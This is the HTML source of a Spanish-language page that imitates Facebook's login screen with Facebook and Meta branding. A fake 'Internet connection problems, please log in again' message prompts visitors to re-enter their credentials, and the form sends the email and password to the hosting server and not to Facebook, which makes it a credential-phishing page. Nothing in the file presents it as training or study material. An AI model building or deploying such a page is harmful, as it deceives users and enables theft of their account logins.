<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="shortcut icon" href="assets/facebook-logo.ico" type="image/x-icon" />
    <link rel="stylesheet" href="style.css" />

    <title>Facebook</title>
  </head>
  <body>
    <div class="login">
      <div class="login-facebook-logo">
        <img src="assets/facebook-logo.png" alt="facebook-logo" class="img-facebook-logo" />
      </div>

      <div class="login-error-message">
        <p class="error-message">
          Problemas de conexión a Internet. Por favor inicia sesión nuevamente
        </p>
      </div>

      <form action="/" method="post" class="form">
        <h4 class="form-title">Iniciar sesión en Facebook</h4>

        <div class="form-inputs">
          <input
            type="email"
            id="email"
            name="email"
            placeholder="Correo electrónico o número de móvil"
            class="form-input form-email-input"
          />
          <input
            type="password"
            id="password"
            name="password"
            placeholder="Contraseña"
            class="form-input form-password-input"
          />
        </div>

        <button type="submit" class="form-btn form-login-btn">Iniciar sesión</button>

        <p class="form-recovery">
          <span>¿Olvidaste tu contraseña?</span>
        </p>

        <button class="form-btn form-new-account-btn">Crear nueva cuenta</button>

        <div class="meta-log">
          <img src="assets/meta-logo.png" alt="meta-logo" />
        </div>
      </form>
    </div>
  </body>
</html>
